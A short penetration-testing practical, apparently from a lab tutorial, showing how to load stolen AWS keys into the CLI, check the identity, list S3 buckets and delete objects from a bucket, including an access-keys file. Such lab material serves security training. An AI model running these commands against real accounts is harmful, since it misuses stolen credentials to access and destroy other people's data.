## For this practical to work, pentester should be able to retrieve working keys from other means(like hacking cloud computer or s3 storage or regular user account)

```bash
#Provide Stolen Key Details after below command
aws configure

#To Get Stolen Keys Details
aws sts get-caller-identity

#Trying to access and modify data in cloud
aws s3 ls
aws s3 ls s3://hsbucket2
aws s3 rm s3://hsbucket2/1
aws s3 rm s3://hsbucket2/smb-3kn32w1v.zip
aws s3 rm s3://hsbucket2/awscliuser_accessKeys.csv
```
